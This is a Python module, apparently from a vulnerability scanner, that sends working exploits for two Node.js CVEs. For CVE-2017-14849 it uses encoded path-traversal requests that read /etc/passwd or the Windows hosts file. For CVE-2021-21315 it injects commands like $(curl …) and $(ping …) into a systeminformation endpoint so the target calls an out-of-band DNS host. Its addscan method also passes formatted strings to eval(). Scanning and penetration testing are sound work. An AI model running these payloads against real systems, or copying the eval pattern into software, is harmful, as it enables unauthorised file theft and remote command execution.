#!/usr/bin/env python3
# -*- coding:utf-8 -*-

'''
Joyent Node.js是美国Joyent公司的一套建立在Google V8 JavaScript引擎之上的网络应用平台
    Nodejs扫描类: 
        1. Node.js 目录穿越
            CVE-2017-14849
                Payload: https://vulhub.org/#/environments/node/CVE-2017-14849/

        2. Node.js 命令执行
            CVE-2021-21315
                Payload: https://blog.csdn.net/weixin_47179815/article/details/125799014

file:///etc/passwd
file:///C:\Windows\System32\drivers\etc\hosts
'''

from lib.api.dns import dns
from lib.initial.config import config
from lib.tool.md5 import md5, random_md5
from lib.tool.logger import logger
from lib.tool.thread import thread
from lib.tool import check
from thirdparty import requests
from time import sleep
import re

class Nodejs():
    def __init__(self):
        self.timeout = config.get('timeout')
        self.headers = config.get('headers')
        self.proxies = config.get('proxies')

        self.app_name = 'Node.js'
        self.md = md5(self.app_name)
        self.cmd = 'echo ' + self.md

        self.cve_2017_14849_payloads = [
            {
                'path': 'static/%2e%2e/%2e%2e/%2e%2e/a/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd',
                'data': ''
            },
            {
                'path': '%2e%2e/%2e%2e/%2e%2e/a/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd',
                'data': ''
            },
            {
                'path': 'static/%2e%2e/%2e%2e/%2e%2e/a/%2e%2e/%2e%2e/%2e%2e/%2e%2e/C:/Windows/System32/drivers/etc/hosts',
                'data': ''
            },
            {
                'path': '%2e%2e/%2e%2e/%2e%2e/a/%2e%2e/%2e%2e/%2e%2e/%2e%2e/C:\\Windows\\System32\\drivers\\etc\\hosts',
                'data': ''
            }
        ]
        
        self.cve_2021_21315_payloads = [
            {
                'path': 'api/getServices?name[]=$(curl DNSdomain)',
                'data': ''
            },
            {
                'path': 'api/getServices?name[]=$(ping -c 4 DNSdomain)',
                'data': ''
            },
            {
                'path': 'api/getServices?name[]=$(ping DNSdomain)',
                'data': ''
            },
            {
                'path': 'getServices?name[]=$(curl DNSdomain)',
                'data': ''
            },
            {
                'path': 'getServices?name[]=$(ping -c 4 DNSdomain)',
                'data': ''
            },
            {
                'path': 'getServices?name[]=$(ping DNSdomain)',
                'data': ''
            }
        ]

    def cve_2017_14849_scan(self, url):
        ''' Joyent Node.js 8.6.0之前的8.5.0版本中存在安全漏洞
            远程攻击者可利用该漏洞访问敏感文件
        '''
        vul_info = {}
        vul_info['app_name'] = self.app_name
        vul_info['vul_type'] = 'File-Read'
        vul_info['vul_id'] = 'CVE-2017-14849'
        vul_info['vul_method'] = 'GET'
        vul_info['headers'] = {}

        # headers = self.headers.copy()
        # headers.update(vul_info['headers'])

        for payload in self.cve_2017_14849_payloads:
            path = payload['path']
            data = payload['data']
            target = url + path

            vul_info['path'] = path
            vul_info['data'] = data
            vul_info['target'] = target

            try:
                res = requests.get(
                    target, 
                    timeout=self.timeout, 
                    headers=self.headers,
                    data=data, 
                    proxies=self.proxies, 
                    verify=False,
                    allow_redirects=False
                )
                logger.logging(vul_info, res.status_code, res)                        # * LOG
            except requests.ConnectTimeout:
                logger.logging(vul_info, 'Timeout')
                return None
            except requests.ConnectionError:
                logger.logging(vul_info, 'Faild')
                return None
            except:
                logger.logging(vul_info, 'Error')
                return None

            if (re.search(r'root:(x{1}|.*):\d{1,7}:\d{1,7}:root', res.text, re.I|re.M|re.S)
                or (('Microsoft Corp' in res.text) 
                    and ('Microsoft TCP/IP for Windows' in res.text))
            ):
                results = {
                    'Target': target,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Request': res
                }
                return results

    def cve_2021_21315_scan(self, url):
        ''' Node.js库中的systeminformation软件包中存在一个命令注入漏洞, 
            攻击者可以通过在未经过滤的参数中注入Payload来执行系统命令
        '''
        sessid = 'ea16de03573ce0c2f731fa40de93ecd7'

        vul_info = {}
        vul_info['app_name'] = self.app_name
        vul_info['vul_type'] = 'RCE'
        vul_info['vul_id'] = 'CVE-2021-21315'
        vul_info['vul_method'] = 'GET'
        vul_info['headers'] = {}

        # headers = self.headers.copy()
        # headers.update(vul_info['headers'])

        for payload in self.cve_2021_21315_payloads:
            md = random_md5()                                       # * 随机md5值, 8位
            dns_domain = md + '.' + dns.domain(sessid)              # * dnslog/ceye域名

            path = payload['path'].replace('DNSdomain', dns_domain)
            data = payload['data']
            target = url + path

            vul_info['path'] = path
            vul_info['data'] = data
            vul_info['target'] = target

            try:
                res = requests.get(
                    target, 
                    timeout=self.timeout, 
                    headers=self.headers,
                    data=data, 
                    proxies=self.proxies, 
                    verify=False,
                    allow_redirects=False
                )
                logger.logging(vul_info, res.status_code, res)                        # * LOG
            except requests.ConnectTimeout:
                logger.logging(vul_info, 'Timeout')
                return None
            except requests.ConnectionError:
                logger.logging(vul_info, 'Faild')
                return None
            except:
                logger.logging(vul_info, 'Error')
                return None

            sleep(2)
            if (md in dns.result(md, sessid)):
                results = {
                    'Target': target,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Payload': res
                }
                return results

    def addscan(self, url, vuln=None):
        if vuln:
            return eval('thread(target=self.{}_scan, url="{}")'.format(vuln, url))

        return [
            thread(target=self.cve_2017_14849_scan, url=url),
            thread(target=self.cve_2021_21315_scan, url=url)
        ]

nodejs = Nodejs()
